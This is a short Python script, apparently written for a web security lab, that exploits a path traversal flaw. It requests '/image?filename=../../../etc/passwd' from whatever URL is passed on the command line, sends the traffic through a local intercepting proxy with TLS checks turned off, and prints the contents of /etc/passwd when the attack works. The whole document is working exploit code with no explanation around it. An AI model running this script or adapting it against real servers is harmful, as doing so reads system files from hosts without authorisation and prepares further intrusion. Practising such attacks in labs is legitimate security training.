import requests
import urllib3
import sys 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8081', 'https':'http://127.0.0.1:8081'}

def path_transversal_exploit(url):
    path="/image?filename=../../../etc/passwd"
    r=requests.get(url+path,verify=False,proxies=proxies)
    if 'root:x' in r.text:
        print("[+] Exploited sucessfully")
        print("[+] The following is the contents of /etc/passwd")
        print(r.text)
        sys.exit(0)
    else:
        print("[-] Exploit Failed.")

def main():
    if len(sys.argv)!=2:
        print("[+]Usage : %s <url>" % sys.argv[0])
        print("[+] Example: %s http://evil.com" % sys.argv[0]) 
        sys.exit(-1)
    url=sys.argv[1]
    path_transversal_exploit(url)

if __name__=="__main__":
    main()